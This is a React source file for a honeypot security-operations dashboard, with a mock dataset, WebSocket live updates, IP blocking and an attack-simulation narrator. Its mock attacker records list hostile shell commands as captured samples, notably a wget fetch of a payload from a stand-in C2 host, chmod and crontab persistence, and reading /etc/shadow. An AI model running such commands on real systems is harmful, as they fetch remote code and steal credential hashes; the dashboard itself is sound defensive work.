import React, { createContext, useContext, useState, useEffect, useRef, useCallback } from 'react';
import { api } from '../api/client';

const SocContext = createContext(null);

const WS_URL = import.meta.env.VITE_WS_URL || 'ws://localhost:8000/ws/live';

function generateMockData() {
  const now = new Date();
  const attackers = [
    {
      id: 1,
      ip: '45.33.32.156',
      risk_score: 92.0,
      risk_band: 'critical',
      intent: 'malware_deployment',
      status: 'blocked',
      is_repeat: true,
      honeypots_touched: ['cowrie', 'opencanary'],
      total_events: 48,
      last_seen: new Date(now.getTime() - 1000 * 60 * 2).toISOString(),
      first_seen: new Date(now.getTime() - 1000 * 60 * 60 * 4).toISOString(),
      fingerprint: '9e107d9d372bb6826bd81d3542a419d6a3b2c1f4e5d6',
      geo: { country: 'RU', city: 'Moscow', lat: 55.75, lon: 37.61, isp: 'DarkNet Host' },
      ports: [22, 2222],
      usernames: ['root', 'admin'],
      passwords: ['toor', '123456'],
      commands: ['whoami', 'uname -a', 'wget http://c2.ru/p.sh', 'chmod +x p.sh', 'crontab -e'],
      urls: ['http://c2.ru/p.sh'],
      hashes: ['9e107d9d372bb6826bd81d3542a419d6'],
      risk_factors: [
        { factor: 'scan', points: 10, reason: 'Port scanning activity observed' },
        { factor: 'brute_force', points: 20, reason: 'Brute force login attempts detected' },
        { factor: 'login_success', points: 20, reason: 'Successful login on honeypot' },
        { factor: 'download_upload', points: 20, reason: 'File transfer activity detected' },
        { factor: 'internal_decoy', points: 25, reason: 'Internal decoy accessed' },
      ],
      risk_history: [
        { ts: new Date(now.getTime() - 1000 * 60 * 40).toISOString(), score: 20, band: 'low' },
        { ts: new Date(now.getTime() - 1000 * 60 * 20).toISOString(), score: 55, band: 'high' },
        { ts: new Date(now.getTime() - 1000 * 60 * 2).toISOString(), score: 92, band: 'critical' },
      ],
    },
    {
      id: 2,
      ip: '198.20.69.74',
      risk_score: 78.0,
      risk_band: 'critical',
      intent: 'credential_theft',
      status: 'active',
      is_repeat: false,
      honeypots_touched: ['cowrie'],
      total_events: 26,
      last_seen: new Date(now.getTime() - 1000 * 60 * 10).toISOString(),
      first_seen: new Date(now.getTime() - 1000 * 60 * 60 * 2).toISOString(),
      fingerprint: 'a8f5c3b12948e7d6201a45c389bf012498e723ac',
      geo: { country: 'CN', city: 'Beijing', lat: 39.9, lon: 116.4, isp: 'Telecom Backbone' },
      ports: [22],
      usernames: ['root', 'support'],
      passwords: ['alpine', 'password'],
      commands: ['whoami', 'cat /etc/shadow'],
      urls: [],
      hashes: [],
      risk_factors: [
        { factor: 'brute_force', points: 20, reason: 'Brute force login detected' },
        { factor: 'login_success', points: 20, reason: 'Valid account breached' },
        { factor: 'recon', points: 10, reason: 'Account discovery enumeration' },
        { factor: 'internal_decoy', points: 25, reason: 'Lateral movement attempt' },
      ],
      risk_history: [
        { ts: new Date(now.getTime() - 1000 * 60 * 20).toISOString(), score: 30, band: 'medium' },
        { ts: new Date(now.getTime() - 1000 * 60 * 10).toISOString(), score: 78, band: 'critical' },
      ],
    },
    {
      id: 3,
      ip: '89.248.167.131',
      risk_score: 65.0,
      risk_band: 'high',
      intent: 'reconnaissance',
      status: 'watchlist',
      is_repeat: true,
      honeypots_touched: ['cowrie', 'dionaea'],
      total_events: 19,
      last_seen: new Date(now.getTime() - 1000 * 60 * 22).toISOString(),
      first_seen: new Date(now.getTime() - 1000 * 60 * 60 * 6).toISOString(),
      fingerprint: '77bcde8901234567abcdef0123456789abcdef01',
      geo: { country: 'NL', city: 'Amsterdam', lat: 52.37, lon: 4.89, isp: 'ColoCrossing' },
      ports: [22, 445],
      usernames: ['guest'],
      passwords: ['guest'],
      commands: ['ifconfig', 'ps aux'],
      urls: [],
      hashes: [],
      risk_factors: [
        { factor: 'scan', points: 10, reason: 'Port scan' },
        { factor: 'multi_honeypot', points: 15, reason: 'Touched 2 honeypots' },
        { factor: 'recon', points: 10, reason: 'Reconnaissance executed' },
        { factor: 'repeat_attacker', points: 10, reason: 'Repeat fingerprint' },
      ],
      risk_history: [],
    },
  ];

  const events = [
    {
      id: 101,
      event_id: 'mock-ev-1',
      timestamp: new Date().toISOString(),
      honeypot: 'cowrie',
      decoy_type: 'external',
      src_ip: '45.33.32.156',
      event_type: 'login_failed',
      username: 'root',
      risk_band: 'critical',
      raw: { src_port: 51234, dst_port: 22 },
      normalised: { event_type: 'login_failed', honeypot: 'cowrie' },
    },
  ];

  const honeypots = [
    { honeypot: 'cowrie', status: 'running', events_total: 1240, cpu_pct: 18.4, mem_mb: 320, last_heartbeat: new Date().toISOString() },
    { honeypot: 'opencanary', status: 'running', events_total: 820, cpu_pct: 12.1, mem_mb: 280, last_heartbeat: new Date().toISOString() },
    { honeypot: 'dionaea', status: 'running', events_total: 640, cpu_pct: 22.0, mem_mb: 410, last_heartbeat: new Date().toISOString() },
    { honeypot: 'conpot', status: 'running', events_total: 310, cpu_pct: 8.5, mem_mb: 210, last_heartbeat: new Date().toISOString() },
  ];

  const incidents = [
    {
      id: 1,
      attacker_id: 1,
      title: 'Critical Threat Incident: 45.33.32.156',
      status: 'investigating',
      created_at: new Date(now.getTime() - 1000 * 60 * 30).toISOString(),
      risk_score_at_creation: 92,
      assignee: 'analyst-alex',
      ttd_seconds: 34.2,
      ttr_seconds: 12.5,
      notes: [{ text: 'Automated containment staged. Malware payload dropped.', author: 'analyst-alex', ts: now.toISOString() }],
      root_cause: { contributing_events: ['45.33.32.156'], factors: ['scan', 'brute_force', 'login_success', 'download_upload', 'internal_decoy'] },
      blast_radius: { honeypots: ['cowrie', 'opencanary'], ports: [22, 445], internal_decoy: true },
      status_history: [
        { status: 'new', ts: new Date(now.getTime() - 1000 * 60 * 30).toISOString(), note: 'Triggered by risk ladder' },
        { status: 'investigating', ts: new Date(now.getTime() - 1000 * 60 * 20).toISOString(), note: 'Assigned to analyst-alex' },
      ],
    },
  ];

  const relationships = [
    {
      id: 1,
      attacker_a_id: 1,
      attacker_b_id: 3,
      attacker_a_ip: '45.33.32.156',
      attacker_b_ip: '89.248.167.131',
      rel_type: 'shared_credentials',
      weight: 0.75,
      evidence: ['Shared credentials pattern (root/toor)', 'Simultaneous scanning activity'],
    },
  ];

  const blocks = [
    {
      id: 1,
      ip: '45.33.32.156',
      attacker_id: 1,
      requested_by: 'system_auto',
      ttl_seconds: 600,
      status: 'active',
      mock: true,
      requested_at: new Date(now.getTime() - 1000 * 120).toISOString(),
      verified_at: new Date(now.getTime() - 1000 * 118).toISOString(),
      expires_at: new Date(now.getTime() + 1000 * 480).toISOString(),
    },
  ];

  const metrics = {
    ttd_avg: 39.6,
    ttr_avg: 12.5,
    alerts_suppressed: 184,
    band_counts: { low: 1, medium: 1, high: 1, critical: 2 },
    events_over_time: Array.from({ length: 24 }).map((_, i) => ({
      hour: `${String(i).padStart(2, '0')}:00`,
      count: Math.floor(Math.sin(i / 3) * 20 + 25 + (i === 18 ? 40 : 0)),
    })),
    top_honeypots: [
      { honeypot: 'cowrie', count: 1240 },
      { honeypot: 'opencanary', count: 820 },
      { honeypot: 'dionaea', count: 640 },
      { honeypot: 'conpot', count: 310 },
    ],
    top_attack_types: [
      { event_type: 'scan', count: 1450 },
      { event_type: 'login_failed', count: 980 },
      { event_type: 'command', count: 320 },
    ],
  };

  const overview = {
    total_events: 3010,
    total_attackers: 5,
    total_incidents: 2,
    active_blocks: 1,
    band_counts: { low: 1, medium: 1, high: 1, critical: 2 },
    events_today: 412,
    honeypots_healthy: 4,
  };

  const actions = [
    {
      id: 1,
      attacker_id: 2,
      incident_id: 2,
      action_type: 'firewall_block',
      target_ip: '198.20.69.74',
      status: 'proposed',
      reason: 'Human approval required for high-risk adversary (score 78)',
      duration_seconds: 600,
      created_at: new Date(now.getTime() - 1000 * 60 * 5).toISOString(),
      details: {},
    },
  ];

  return { attackers, events, honeypots, incidents, relationships, blocks, metrics, overview, actions };
}

export function SocProvider({ children }) {
  const [isDemoMode, setIsDemoMode] = useState(false);
  const [isLiveConnected, setIsLiveConnected] = useState(false);
  const [loading, setLoading] = useState(true);

  // Core Data
  const [overview, setOverview] = useState(null);
  const [events, setEvents] = useState([]);
  const [isEventsPaused, setIsEventsPaused] = useState(false);
  const isEventsPausedRef = useRef(false);
  isEventsPausedRef.current = isEventsPaused;

  const [attackers, setAttackers] = useState([]);
  const [honeypots, setHoneypots] = useState([]);
  const [incidents, setIncidents] = useState([]);
  const [relationships, setRelationships] = useState([]);
  const [blocks, setBlocks] = useState([]);
  const [actions, setActions] = useState([]);
  const [metrics, setMetrics] = useState(null);

  // UI Toast notification state
  const [toasts, setToasts] = useState([]);
  const addToast = useCallback((msg, type = 'info') => {
    const id = Date.now() + Math.random();
    setToasts((prev) => [...prev, { id, msg, type }]);
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 4000);
  }, []);

  // Demo narrator overlay state
  const [narrator, setNarrator] = useState(null);

  // Selected for drawers / modals
  const [selectedAttackerId, setSelectedAttackerId] = useState(null);
  const [selectedHoneypot, setSelectedHoneypot] = useState(null);

  // Incoming animation pulses
  const [incomingPing, setIncomingPing] = useState(null);

  const wsRef = useRef(null);
  const reconnectTimeoutRef = useRef(null);

  // Fetch all initial data
  const refreshAllData = useCallback(async () => {
    try {
      const [ovData, evData, atkData, hpData, incData, relData, blkData, metData, actData] = await Promise.all([
        api.getOverview().catch(() => null),
        api.getEvents({ limit: 100 }).catch(() => null),
        api.getAttackers().catch(() => null),
        api.getHoneypotHealth().catch(() => null),
        api.getIncidents().catch(() => null),
        api.getRelationships().catch(() => null),
        api.getBlocks().catch(() => null),
        api.getMetrics().catch(() => null),
        api.getActions().catch(() => null),
      ]);

      if (!ovData) {
        throw new Error('Backend unreachable');
      }

      setIsDemoMode(false);
      setOverview(ovData);
      setEvents(evData?.events || []);
      setAttackers(atkData?.attackers || []);
      setHoneypots(hpData?.honeypots || []);
      setIncidents(incData?.incidents || []);
      setRelationships(relData?.relationships || []);
      setBlocks(blkData?.blocks || []);
      setMetrics(metData || null);
      setActions(actData || []);
    } catch (err) {
      console.warn('Backend connection failed, loading fallback demo dataset:', err.message);
      setIsDemoMode(true);
      const mock = generateMockData();
      setOverview(mock.overview);
      setEvents(mock.events);
      setAttackers(mock.attackers);
      setHoneypots(mock.honeypots);
      setIncidents(mock.incidents);
      setRelationships(mock.relationships);
      setBlocks(mock.blocks);
      setMetrics(mock.metrics);
      setActions(mock.actions);
    } finally {
      setLoading(false);
    }
  }, []);

  // WebSocket Connection
  useEffect(() => {
    let unmounted = false;

    function connectWs() {
      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) return;

      try {
        const ws = new WebSocket(WS_URL);
        wsRef.current = ws;

        ws.onopen = () => {
          if (!unmounted) {
            setIsLiveConnected(true);
            console.log('SENTINEL SOC Live WebSocket connected.');
          }
        };

        ws.onmessage = (msgEv) => {
          try {
            const data = JSON.parse(msgEv.data);
            const { type, payload } = data;

            if (type === 'event') {
              if (!isEventsPausedRef.current) {
                setEvents((prev) => [payload, ...prev.slice(0, 199)]);
              }
              setIncomingPing({ ...payload, ts: Date.now() });

              // update overview count
              setOverview((prev) => prev ? { ...prev, total_events: (prev.total_events || 0) + 1 } : prev);
            } else if (type === 'attacker_update') {
              setAttackers((prev) => {
                const idx = prev.findIndex((a) => a.id === payload.id || a.ip === payload.ip);
                if (idx >= 0) {
                  const updated = [...prev];
                  updated[idx] = { ...updated[idx], ...payload };
                  return updated;
                }
                return [payload, ...prev];
              });
            } else if (type === 'relationship') {
              setRelationships((prev) => {
                const exists = prev.some((r) => r.id === payload.id);
                if (!exists) {
                  addToast(`New Correlation: ${payload.attacker_a_ip} <-> ${payload.attacker_b_ip}`, 'info');
                  return [payload, ...prev];
                }
                return prev;
              });
            } else if (type === 'incident') {
              setIncidents((prev) => {
                const idx = prev.findIndex((i) => i.id === payload.id);
                if (idx >= 0) {
                  const updated = [...prev];
                  updated[idx] = { ...updated[idx], ...payload };
                  return updated;
                }
                addToast(`Critical Incident: ${payload.title}`, 'error');
                return [payload, ...prev];
              });
              setOverview((prev) => prev ? { ...prev, total_incidents: (prev.total_incidents || 0) + 1 } : prev);
            } else if (type === 'action') {
              setActions((prev) => {
                const idx = prev.findIndex((a) => a.id === payload.id);
                if (idx >= 0) {
                  const upd = [...prev];
                  upd[idx] = { ...upd[idx], ...payload };
                  return upd;
                }
                addToast(`Action Proposed: ${payload.action_type} on ${payload.target_ip}`, 'warning');
                return [payload, ...prev];
              });
            } else if (type === 'block') {
              setBlocks((prev) => {
                const idx = prev.findIndex((b) => b.id === payload.block_id || b.ip === payload.ip);
                if (idx >= 0) {
                  const updated = [...prev];
                  updated[idx] = { ...updated[idx], ...payload, status: 'active' };
                  return updated;
                }
                return [{ id: payload.block_id || Date.now(), ip: payload.ip, status: 'active', requested_by: payload.requested_by || 'auto', ttl_seconds: payload.ttl_seconds || 600, expires_at: new Date(Date.now() + 600000).toISOString() }, ...prev];
              });
              setAttackers((prev) =>
                prev.map((a) => (a.ip === payload.ip ? { ...a, status: 'blocked' } : a))
              );
              setOverview((prev) => prev ? { ...prev, active_blocks: (prev.active_blocks || 0) + 1 } : prev);
              addToast(`Firewall Block Verified: ${payload.ip}`, 'warning');
            } else if (type === 'rollback') {
              setBlocks((prev) =>
                prev.map((b) => (b.ip === payload.ip ? { ...b, status: 'rolled_back' } : b))
              );
              setAttackers((prev) =>
                prev.map((a) => (a.ip === payload.ip ? { ...a, status: 'active' } : a))
              );
              setOverview((prev) => prev ? { ...prev, active_blocks: Math.max(0, (prev.active_blocks || 1) - 1) } : prev);
              addToast(`Auto-Rollback Complete: ${payload.ip} unblocked`, 'info');
            }
          } catch (e) {
            console.error('Error parsing WS message:', e);
          }
        };

        ws.onclose = () => {
          if (!unmounted) {
            setIsLiveConnected(false);
            reconnectTimeoutRef.current = setTimeout(connectWs, 3000);
          }
        };

        ws.onerror = () => {
          ws.close();
        };
      } catch (err) {
        setIsLiveConnected(false);
        reconnectTimeoutRef.current = setTimeout(connectWs, 5000);
      }
    }

    refreshAllData();
    connectWs();

    const pollInterval = setInterval(() => {
      refreshAllData();
    }, 15000);

    return () => {
      unmounted = true;
      if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
      clearInterval(pollInterval);
      if (wsRef.current) wsRef.current.close();
    };
  }, [refreshAllData, addToast]);

  // Actions
  const blockAttackerAction = async (id, ip) => {
    try {
      if (!isDemoMode) {
        await api.blockAttacker(id);
      }
      setAttackers((prev) =>
        prev.map((a) => (a.id === id || a.ip === ip ? { ...a, status: 'blocked' } : a))
      );
      setBlocks((prev) => [
        {
          id: Date.now(),
          ip,
          attacker_id: id,
          status: 'active',
          ttl_seconds: 600,
          requested_at: new Date().toISOString(),
          expires_at: new Date(Date.now() + 600000).toISOString(),
          mock: true,
        },
        ...prev.filter((b) => b.ip !== ip),
      ]);
      setOverview((prev) => prev ? { ...prev, active_blocks: (prev.active_blocks || 0) + 1 } : prev);
      addToast(`Firewall block successfully enforced for ${ip}`, 'success');
      return true;
    } catch (e) {
      addToast(`Block failed: ${e.message}`, 'error');
      return false;
    }
  };

  const unblockAttackerAction = async (id, ip) => {
    try {
      if (!isDemoMode) {
        await api.unblockAttacker(id);
      }
      setAttackers((prev) =>
        prev.map((a) => (a.id === id || a.ip === ip ? { ...a, status: 'active' } : a))
      );
      setBlocks((prev) =>
        prev.map((b) => (b.ip === ip ? { ...b, status: 'rolled_back' } : b))
      );
      setOverview((prev) => prev ? { ...prev, active_blocks: Math.max(0, (prev.active_blocks || 1) - 1) } : prev);
      addToast(`Firewall block removed / rolled back for ${ip}`, 'info');
      return true;
    } catch (e) {
      addToast(`Unblock failed: ${e.message}`, 'error');
      return false;
    }
  };

  const approveActionReq = async (actionId) => {
    try {
      const res = await api.approveAction(actionId);
      setActions((prev) => prev.map((a) => (a.id === actionId ? { ...a, status: 'verified', approver: 'analyst' } : a)));
      addToast(`Action #${actionId} approved & block verified`, 'success');
      refreshAllData();
      return res;
    } catch (e) {
      addToast(`Action approval failed: ${e.message}`, 'error');
      throw e;
    }
  };

  const rejectActionReq = async (actionId, reason) => {
    try {
      const res = await api.rejectAction(actionId, 'analyst', reason);
      setActions((prev) => prev.map((a) => (a.id === actionId ? { ...a, status: 'rejected', approver: 'analyst' } : a)));
      addToast(`Action #${actionId} rejected`, 'info');
      return res;
    } catch (e) {
      addToast(`Action rejection failed: ${e.message}`, 'error');
      throw e;
    }
  };

  const runSimulationAction = async (scenario = 'full_chain', speed = 2.0) => {
    try {
      addToast(`Starting attack simulation: ${scenario}`, 'info');
      if (scenario === 'full_chain') {
        // Run live interactive narration overlay
        setNarrator({
          step: 1,
          title: 'Stage 1: Reconnaissance',
          desc: 'Adversary probes exposed Cowrie SSH honeypot on port 22.',
        });
        setTimeout(() => {
          setNarrator({
            step: 2,
            title: 'Stage 2: Brute Force Attempt',
            desc: 'High-frequency credential stuffing with common usernames/passwords.',
          });
        }, 3000);
        setTimeout(() => {
          setNarrator({
            step: 3,
            title: 'Stage 3: Valid Account Breach',
            desc: 'Attacker gains interactive shell access; begins enumeration (whoami, id).',
          });
        }, 6000);
        setTimeout(() => {
          setNarrator({
            step: 4,
            title: 'Stage 4: Malware Infiltration & Lateral Decoy Probe',
            desc: 'C2 payload staged via wget; internal decoy accessed. Risk velocity reaches 100/100.',
          });
        }, 9000);
        setTimeout(() => {
          setNarrator({
            step: 5,
            title: 'Stage 5: Autonomous Containment',
            desc: 'Firewall block auto-enforced; Incident generated; 600s TTL countdown started.',
          });
        }, 12000);
        setTimeout(() => {
          setNarrator(null);
        }, 16000);
      }
      if (!isDemoMode) {
        await api.startSimulation(scenario, speed);
      }
    } catch (e) {
      addToast(`Simulation start error: ${e.message}`, 'error');
    }
  };

  const patchIncidentAction = async (id, data) => {
    try {
      if (!isDemoMode) {
        const updated = await api.patchIncident(id, data);
        setIncidents((prev) => prev.map((i) => (i.id === id ? updated : i)));
        addToast(`Incident #${id} updated to ${data.status || 'new status'}`, 'success');
        return updated;
      } else {
        setIncidents((prev) =>
          prev.map((i) => (i.id === id ? { ...i, ...data, updated_at: new Date().toISOString() } : i))
        );
        addToast(`Incident #${id} updated locally`, 'info');
      }
    } catch (e) {
      addToast(`Failed to update incident: ${e.message}`, 'error');
    }
  };

  const addIncidentNoteAction = async (id, noteText, author = 'analyst') => {
    try {
      if (!isDemoMode) {
        const updated = await api.addIncidentNote(id, { text: noteText, author });
        setIncidents((prev) => prev.map((i) => (i.id === id ? updated : i)));
        addToast('Investigation note saved', 'success');
      } else {
        setIncidents((prev) =>
          prev.map((i) =>
            i.id === id
              ? {
                  ...i,
                  notes: [...(i.notes || []), { text: noteText, author, ts: new Date().toISOString() }],
                }
              : i
          )
        );
        addToast('Note saved locally', 'info');
      }
    } catch (e) {
      addToast(`Failed to add note: ${e.message}`, 'error');
    }
  };

  return (
    <SocContext.Provider
      value={{
        isDemoMode,
        isLiveConnected,
        loading,
        overview,
        events,
        isEventsPaused,
        setIsEventsPaused,
        attackers,
        honeypots,
        incidents,
        relationships,
        blocks,
        actions,
        metrics,
        toasts,
        addToast,
        narrator,
        setNarrator,
        selectedAttackerId,
        setSelectedAttackerId,
        selectedHoneypot,
        setSelectedHoneypot,
        incomingPing,
        refreshAllData,
        blockAttacker: blockAttackerAction,
        unblockAttacker: unblockAttackerAction,
        approveAction: approveActionReq,
        rejectAction: rejectActionReq,
        runSimulation: runSimulationAction,
        patchIncident: patchIncidentAction,
        addIncidentNote: addIncidentNoteAction,
      }}
    >
      {children}
    </SocContext.Provider>
  );
}

export function useSoc() {
  const context = useContext(SocContext);
  if (!context) {
    throw new Error('useSoc must be used within a SocProvider');
  }
  return context;
}
